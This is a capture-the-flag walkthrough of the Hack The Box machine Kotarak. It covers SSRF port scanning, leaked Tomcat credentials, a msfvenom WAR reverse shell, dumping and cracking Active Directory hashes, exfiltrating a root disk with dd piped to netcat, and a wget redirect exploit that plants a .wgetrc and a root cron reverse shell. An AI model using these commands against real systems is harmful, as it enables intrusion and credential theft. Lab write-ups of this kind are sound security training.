# Kotarak [HTB](https://app.hackthebox.com/machines/101)
![kotarak-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/kotarak-01.png)

## Recon

After adding the target to my `/etc/hosts` file I start scanning for open ports:

```bash
nmap -p- --min-rate 10000 kotarak.htb
```

![ports-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/ports-02.png)


Next, I run a version detection scan againts the found ports:

```bash
nmap -p 22,8009,8080,60000 -sCV kotarak.htb -oN nmap.result
```

![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/nmap-res-03.png)


We have the following:

+ An SSH server on port 22.
+ An Apache Jserv server on port 8009.
+ An Apache Tomcat/8.5.5 server on port 8080.
+ An Apache/2.4.18 server on port 60000.


We have a fairly extensive web deployment here, with three types of Apache servers running on the target. The `Jserv` server uses the [AJP](https://en.wikipedia.org/wiki/Apache_JServ_Protocol) protocol (an optimized binary version of HTTP) which allows standalone Apache servers to talk to a backend Tomcat server. 


If we search for ways of exploiting the Jserv server we will primarily find the [Ghostcat File Read/Inclusion](https://www.exploit-db.com/exploits/48143) vulnerability from 2020. Though since this box was released in 2017 I'm going to ignore this exploit. In general I don't think the Jserv server is the way forward, as we have more relevant severs to test with the Tomcat and Apache servers. 


Finally, based on the SSH probing scripts we can guess that the target OS is probably `Ubuntu`.


With all of that said, let's start with the Apache server on port 60000. 


## Apache Port 60000


If we browse towards `http://kotarak.htb:60000/` we see the following:

![site-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/site-04.png)


All three links in the page are empty, and we have what looks like an input field. I wans't sure what to input exactly, so I took a look at the srouce code and saw the following form:

![source-form-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/source-form-05.png)


This form saves our input to the `path` parameter, and redirects it to the `url.php` script which should retrieve said URL on our behalf and print out the results. In essence giving us a `"private browser"`.


Two possible vulnerabilities jump to my mind: `LFI/RFI` and `SSRF`. 


I started with the former.


### LFI/RFI


My first instinct was to serve [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell)'s PHP reverse-shell script via a local python web server, and send the target to fetch and execute it, in the hopes it will give me a shell.


The target made a connection to retrieve the script:

![retrive-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/retrive-05.png)


But didn't execute it. Rather, the target simply printed the file's contents:

![contents-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/contents-06.png)


If we intercept the transaction in Burp proxy, we can see the following:

![intercept-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/intercept-07.png)


The target is treating the retrieved content as HTML, not PHP. I tried changing the content-type header to a valid PHP script value like `application/php`, `text/php` or `application/x-httpd-php-source` but this just returned an empty response from the target. 


My next logical step was to try and abuse [PHP wrappers](https://www.php.net/manual/en/wrappers.php). I started by sending a simple `file` wrapper for `/etc/passwd` as such:

![wrapper-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/wrapper-08.png)


Which provoked the following response:

![try-harder-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/try-harder-09.png)


At this point I thought I was getting close, and that the way forward is to abuse the PHP wrappers. So I sent more complex forms of payloads like:

```php
php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd
php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd
php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php phpinfo(); ?>lalalala
```

I also tried a few other types of wrappers like `execpt://`, `input://`, `data://`, `file://` but to no avail. 


At this point, I decided to run a directory and file scan to see if there is more to this site that i'm missing:

```bash
ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://kotarak.htb:60000/FUZZ -e .txt,.xml,.html,.php
```

![ffuf-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/ffuf-10.png)


The `info.php` was the most unexpected, and it displays the result of the `phpinfo()` function:

![phpinfo-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/phpinfo-11.png)


In the `Core` section we can see that `file_uploads` is enabled. Which means that if we do manage to find an LFI vulnerability, we can chain this to get [RCE](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo). However my hopes for an `LFI/RFI` vulnerability on this target was starting to dwindle down. 


Instead, I started thinking about `SSRF`.


### SSRF


`SSRF` or "Server-Side-Request-Forgery", is a vulnerability where an attacker can force the server-side application to make requests to unintended locations on the attackers behalf. This is typically leveraged to make requests to internal network resources that cannot be accessed externally.


In this case, we don't really have an internal network, but we do have web-resources that can only be accessed from the localhost, like the `server-status` page.  


We can try and point the application towards itself, and see if we can retrieve the `server-staus` page. We can do this by inputting something like this `http://localhost:60000/server-status`:

![server-status-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/server-status-13.png)


We are able to access internal resources through the localhost! 


This is probably due to poor user input validation, but the question is how do we exploit this? 


At first I didn't have a clear answer for this. Although we can access internal resources, it's not clear which resources are present on the target, which resources will help us get access to the system, and to which resources we even have access to. 


At first I tried to get the source code for the `url.php` script with a request like this: `http://localhost:60000/url.php`, but this returned an empty response. 


Then I tried something I knew would fail, which was to request the SSH service running on port 22 with a request like this `http://localhost:22`:

![mismatch-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/mismatch-14.png)


We got some text as a response. We knew that SSH was enabled on the target, but this text was a confirmation. 


If we try to access a port that's likely to be closed with a request like `http://localhost:6`, we should receive an empty response, confirming that the port is indeed closed:

![empty-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/empty-15.png)


So if you think about it, we just found ourselfs an internal port scanner. All we have to do, is write a simple script to test for all 65535 ports, and see what internal services may be running on the internal localhost subnet of the target. 


I came up with something like this:

```bash
#!/bin/sh

for i in `seq 1 65535`; do
        response=$(curl -s "http://kotarak.htb:60000/url.php?path=http://localhost:$i")
        if [ ! -z "$response" ]; then
                echo "Port $i is open:"
                echo "$response"
                echo " "
        fi
done
```


This takes quite a long time to finish, but I wait patiently because we know that there is a web server on port 60000, so there very well could be services running on ports higher then that. 


Here are the results from the scan:

+ Port 90:

![port90-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/port90-16.png)


Not super useful.


+ Port 110:

![port110-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/port110-17.png)


Not usper useful either.


+ Port 200: 

![port200-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/port200-18.png)


Another empty site.


+ Port 320:

![login-page-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/login-page-19.png)


This looked interesting. But if we try to login, the request will be sent back to `http://kotarak.htb:60000` instead of the internal site at `http://localhost:320`. So regardless of what we input as the password, we will always get this login page:

![forward-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/forward-20.png)


+ Port 888

This site however, did turned out to be useful:

![port888-21](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/port888-21.png)


This site seems to be hosting a few files. If we hover over an entry here, we will see a link towards `http://kotarak.htb:60000/url.php?doc=tetris.c`. 


We know from the previous login page that subsequent interactions with these internal websites will always redirect back to `http://kotarak.htb:60000/url.php`. 


So if we where to strip this external redirect, and imagine that wer'e accessing this website internally, the actual redirect should look like this: `http://localhost:888/?doc=tetris.c`. 


If we input this URL to the `SSRF` site we get the file:

![tetris-22](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/tetris-22.png)


Let's try to get that backup file. If we request it via the `SSRF` site we will get an empty response. But if we intercept the traffic in Burp proxy, we will see the contents of the file, which turned out to be the `tomcat-users.xml` file:

![backup-23](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/backup-23.png)


Here we see the username and password for the `admin` user. We can also see this user has the `manager`, `manager-gui`, `admin-gui` & `manager-script` Tomcat roles, which should give us complete control over the web-based GUI manager application. 



I know that the Tomcat GUI manager app is located at `http://kotarak.htb:8080/manager/html`, so if we open this URL we will be prompted for credentials:

![prompt-24](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/prompt-24.png)


I use the creds from the backup file and I get in:

![manager-25](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/manager-25.png)


From here we can deploy a WAR application which contains a reverse shell. A common way of exploting Tomcat Manager access to get a shell on the target system.


The first thing I do is create the malicious `WAR` app, I do this using `msfvenom` as such:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.44 LPORT=443 -f war -o shell.war
```


Then, in the Manager interface, I select the `WAR` archive and deploy it:

![deploy-26](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/deploy-26.png)


After we hit `List Applications`, we should see our newly deployed app located at `/rshell`:

![app-27](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/app-27.png)


Now I start the local listner with:

```bash
rlwrap nc -lnvp 443
```

And click on the link which gives me a shell:

![shell-28](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/shell-28.png)



## Privilege Escalation

After I landed on the box I spwaned a TTY shell by running:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Both from the output of the previously ran `hostname` command, as well as from our newly spwaned TTY shell prompt, we can see that the hostname of the target is set to `kotarak-dmz`. This is the first time I see such a hostname on a HTB machine, and it tells me that perhaps there is another VM or container on the system? 


I decided to run `ifconfig` to see which interfaces are available on this system, and I saw the following interface:

![ifconfig-28.5](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/ifconfig-28.5.png)


This looks like a container interface. So we would probably need to get inside the container at some point to root this box. 


However, since our current user `tomcat` is not a part of the `lxc/lxd` groups, I decided to leave this alone for now and try to find any users who might be.  


To do that I list the contents of the `/home` directory:

![users-29](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/users-29.png)


I decided to start with the `tomcat` user since this is our current user access. 

+ Tomcat

The `/home/tomcat` direcotry has the following directory tree: `to_archive/pentest_data/` which in turn, has two files inside of it:

![tomcat-files-30](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/tomcat-files-30.png)


One of the files here has a `.dit` extension. The `dit` acronym stands for `Directory Information Tree`, and this type of file is used in Active Directory to store the hierarchy of the domain including information about user objects, groups and group membership, as well as password hashes for all users in the domain.


The file has the string `psexec.ntdsgrab` in it, which is actually a metasploit module used to extract the `ntds.dit` file along with the SYSTEM hive file and store them locally, with the `.bin` file being the SYSTEM hive. These two files can be used by certain tools to parse out the password hashes of the domain users. 


Let's try to do that! 


First, we need to transfer both files to our attack machine. To do that, I start an FTP server on my Kali machine using:

```bash
python -m pyftpdlib -w
```

Then I connect to this FTP server from the target and copy the files over:

```bash
ftp 10.10.14.44 2121
ftp> anonymous
ftp> anonymous
ftp> put 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
ftp> put 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
ftp> bye
```


The file upload takes a bit of time but I wait patiently. After a couple of minutes I have both files on my Kali:

![hive-31](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/hive-31.png)


Now we can dump out the NTLM hashes using `secretsdump` from Impacket:

```bash
impacket-secretsdump -ntds 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit -system 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin -hashes lmhash:nthash LOCAL -outputfile ntlm_hashes
```

![ntlm-hashes-32](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/ntlm-hashes-32.png)


We get the NTLM hashes! 


If we take `atanas`'s hash and test it in [crackstation](https://crackstation.net/), we can see it cracks to `Password123!`:

![crack-33](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/crack-33.png)


Unfortunately, using this password to login to the SSH server fails! So I tested the `Administrator`s hash in crackstation as well and it cracks to `f16tomcat!`. 


I used this new password to connect to the SSH server as `atanas` but to no avail. 


Instead, I tried to get a shell as `atanas` using the `su` command. I found that the `f16tomcat!` password works:

![atanas-34](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/atanas-34.png)


### Atanas


Based on the output of the `id` command, we can see that `atanas` is a part of the `disk` group, which is desinged to give low-privilged users access to operate on block devices, partitions and filesystems using tools like: `dd`, `mount`, `fsck`, `debugfs`, `parted`, etc. 


Interacting with block devices is a very high-privileged operation since it involves many kernel system calls. This privilege can be abused to debug the block device on which the root filesystem is mounted giving us essentially root access to it. 


If we take a look at `atanas`'s bash history, we can see that `atanas` accessed the `/dev/sda1` partition using `debugfs`:

![history-35](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/history-35.png)


Using `debugfs` we can traverse the selected block device with essentially root access, reading any file we want. But the `debugfs` shell is be a bit clunky, and it's not the best idea of exploiting this privilege.


What we can do instead, is use `dd` to copy the block device that has the root filesystem mounted on it, and send it over to our attack machine. From there we can mount it locally, and have full access to the target's filesystem. 


Before we do that, we need to understand the block device layout on this system. We can do that by running `lsblk`:

![lsblk-36](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/lsblk-36.png)


We can see that we actully have Logical-Volume-Manager or `LVM` deployed on this system. [LVM](https://en.wikipedia.org/wiki/Main_Page) is very cool framework that virtualizes block devices on Unix system, making them much, much easier to administer. 


We can see the root filesystem is actully mounted on the logical volume group `Kotarak--vg--root`, which should be located at `/dev/mapper/Kotarak-vg/root`. 


Let's exploit this! 


### Disk Group Escalation


To perfrom the exploit, all we have to do is start a local listener on our Kali machine that will intercept the data coming from the target and write it into a file:

```bash
nc -lnvp 445 > rootfs.gz
```

Then, we can copy the `/dev/mapper/Kotarak-vg/root` block device, compress it so it will transfer faster, and send it to the netcat listener. We can do all this with the following command:


```bash
dd if=/dev/Kotarak-vg/root | gzip -1 - | nc 10.10.14.50 445
```

![dd-37](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/dd-37.png)


This will take a couple of minutes to complete. Once it's done, we can extract and mount the filesystem on our attack machine using:

```bash
mv rootfs.gz /mnt; cd /mnt; mkdir kotarak
gunzip rootfs.gz
mount rootfs kotarak
```

I did this on a Ubuntu VM I have, instead of my Kali (I had some spacing issues, which I decided to fix after this box). But here is the filesytem:

![rootfs-38](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/rootfs-38.png)


We know from the initial stages of the privilege esacaltion that we have a container somewhere on this system. Typically containers are stored at `/var/lib/docker/` though this path dosen't exists on the system. 


But `/var/lib/lxc` does:

![container-39](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/container-39.png)


We see a container named `Kotarak-int`, which fits the naming convention of the host system. If we investigate the `root` directory in the container we can find the root flag:

![flag-40](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/flag-40.png)


This is very nice, but it's not a root shell.


Let's fix that!  


### Wget exploit

If we list the permissions of the `/root` directory of the host filesystem, we will see that it's completely open to everyone:

![root-perms-41](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/root-perms-41.png)


So we can go back to our shell as `atanas` and keep investigating from there:

![files-42](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/files-42.png)


There are two unusual files here:

+ `flag.txt`

![flag-42.5](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/flag-42.5.png)


I'm guessing that this is a hint to locate the container and get the root flag from there.


Not super useful for us right now. 


+ `app.log`

![app-log-43](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/app-log-43.png)


We can see three requests coming from a `10.0.3.133` host to retrieve `archive.tar.gz`.


As no port is specified in the requests, we can conclude that it tries to access port 80, but we know that there is no web-server running on port 80 on this target.  


The client making these requests is coming from `10.0.3.133`, this is the subnet of our container at `10.0.3.0/24`. If we try to ping this host we get a response:

![ping-44](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/ping-44.png)



So these requests must be coming from withing the container. 


We can also see that the user-agent used in the request is `wget 1.16`. If we search for exploits online we can find the [following RCE](https://www.exploit-db.com/exploits/40064) vulnerability on ExploitDB.


Here is a high-level overview of the vulnerability:


When `wget` is tasked with retriving a file, say `http://attackers-server/safe_file.txt`, the file will be saved as `safe_file.txt` in the working directory from which `wget` was invoked. 


If the `attackers-server` server responds with a 30X code, redirecting the `wget` client to an FTP server hosting a different file like `.bash_profile`, the  `wget` client will save the file as `.bash_profile` instead of the originally requested `safe_file.txt`, which translates to arbitrary file uploads.  


Here is a simple execution flow:

```bash
victim@trusty:~$ wget --version | head -n1
GNU Wget 1.17 built on linux-gnu.

victim@trusty:~$ pwd
/home/victim

victim@trusty:~$ ls
victim@trusty:~$   

victim@trusty:~$ wget http://attackers-server/safe-file.txt
Resolving attackers-server... 192.168.57.1
Connecting to attackers-server|192.168.57.1|:80... connected.
HTTP request sent, awaiting response... 302 Found
Location: ftp://192.168.57.1/.bash_profile [following]
           => â€˜.bash_profileâ€™
Connecting to 192.168.57.1:21... connected.
Logging in as anonymous ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> SIZE .bash_profile ... 55
==> PASV ... done.    ==> RETR .bash_profile ... done.
Length: 55 (unauthoritative)

.bash_profile          100%[==========================>]      55  --.-KB/s   in 0s

2016-02-19 04:50:37 (1.27 MB/s) - â€˜.bash_profileâ€™ saved [55]


victim@trusty:~$ ls -l
total 4
-rw-rw-r-- 1 victim victim 55 Feb 19 04:50 .bash_profile
victim@trusty:~$
```


See the issue? 


The real question is, how do we exploit this to get a root shell? 


If we follow along the exploit notes, we will find a POC script for a scenario in which `wget` is run via a cronjob. And it is possible to leverage this cronjob to get a shell from it. 


The exploit will happen in two phases: 


1) In the target's initial request for the original content, we will redirect it to an FTP server hosting a malicious `.wgetrc` file, which has two configuration options set:

+ `post_file=/etc/shadow`. This will setup the subsequant request.

+ `output_document=/etc/cron.d/wget-root-shell`. This will setup the malicious cronjob that will give us root shell.


2) The next time the cronjob runs, `wget` will read our uploaded `.wgetrc` config file and perform a POST request to our malicious HTTP server. To which we will reply with a prepared cronjob that contains a reverse shell, which will be saved to `/etc/cron.d/wget-root-shell` based on our `.wgetrc` file. 



This is not a simple setup, rather it's quite complex, and it took me reading it a couple of times to truly understand. 


However, this whole plan is dependent on two facts:

1) There must be a cronjob running `wget` on our target system.
2) We need to find a way to bind a socket on high-privileged port (80) on the target in order to run the exploit.


Let's start with the latter issue. 


At first, I tried to start an HTTP server on the target using python:

```bash
python3 -m http.server 80
```

![err-45](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/err-45.png)


Ok, fair enough...


Next, I started thinking about [capabilities](https://en.wikipedia.org/wiki/Capability-based_security). We can list the files on the system that have capabilities attached to them by running:

```bash
getcap -r / 2>/dev/null
``` 


Unfortunately, this didn't yield any meaningful results. So instead I decided to run [linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) to see if there is something that I missed.


Although I didn't find any new capabilities, I did saw the following:

![peas-46](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/peas-46.png)

 
A quick Google search teels me that this program is desinged to allow low-privilge users to bind sockets to high-privileged ports :D


If we check the permissions to this program we can see it's only accessible by our user `atanas`:

![ll-47](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/ll-47.png)


So now we can add the `authbind` command to our python server and we should be able to start a socket on port 80:

```bash
authbind python3 -m http.server 80
```


And just a couple of seconds later I receive a connection from `10.0.3.133`:

![conn-48](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/conn-48.png)


So now can confirm that there is a cronjob running from inside the container that makes these requests, and we can bind to low ports, so we can probably exploit this! 


Here is the setup:


1) create the malicious `.wgetrc` file on the target. 

This file will be hosted by the FTP server later on. To create the file we can actually copy from the POC as it should serve our purpose:

```bash
cat <<_EOF_>.wgetrc
post_file = /etc/shadow
output_document = /etc/cron.d/wget-root-shell
_EOF_
```

![wgetrc-49](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/wgetrc-49.png)


2) Copy the exploit and modify it. 

We can just copy the exploit from the POC to our attack machine and make the following changes:

![changes-50](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/changes-50.png)


I upadted the HTTP and FTP servers settings, and I replaced the cronjob payload with a reverse shell payload which I verified that works beforehand. 


3) Transfer this exploit over to the target.

I do this using a simple python server on my attack machine:

```bash
python3 -m http.server 80
```

And I download the file from the target using `wget`:

```bash
wget http://10.10.14.50/wget-exploit.py; chmod +x wget-exploit.py
```


4) Start the FTP server.

For this we need to start another shell on the target in order to run the FTP server on. So I just repeat the Tomcat exploit using a new WAR payload. Then we can run the following to start the FTP server:

```bash
autbind python -m pyftpdlib 
```

![start-ftp-51](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/start-ftp-51.png)


Looks good. 


5) Start the local listener for the reverse shell.

I do this with:

```bash
rlwrap nc -lnvp 3899
```


6) Execute! 

At this point we should be good to go, so we can run the exploit using:

```bash
authbind python wget-exploit.py
```

Initially, we get the original GET request:

![initial-http-52](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/initial-http-52.png)


The exploit redirected the cronjob over to our FTP server which caught the request and served our malicious `.wgetrc` file:

![initial-ftp-53](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/ftp-initial-53.png)


Less then a minute afterwards, I receive the second request:

![second-http-53](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/http-second-53.png)

![second-http-54](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/second-http-54.png)


Our HTTP server caught the request and redirected back to the FTP. Which this time, served the malicious cronjob we created. 


Then after a few seconds I got a connection from root on my netcat listener:

![root-55](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/root-55.png)
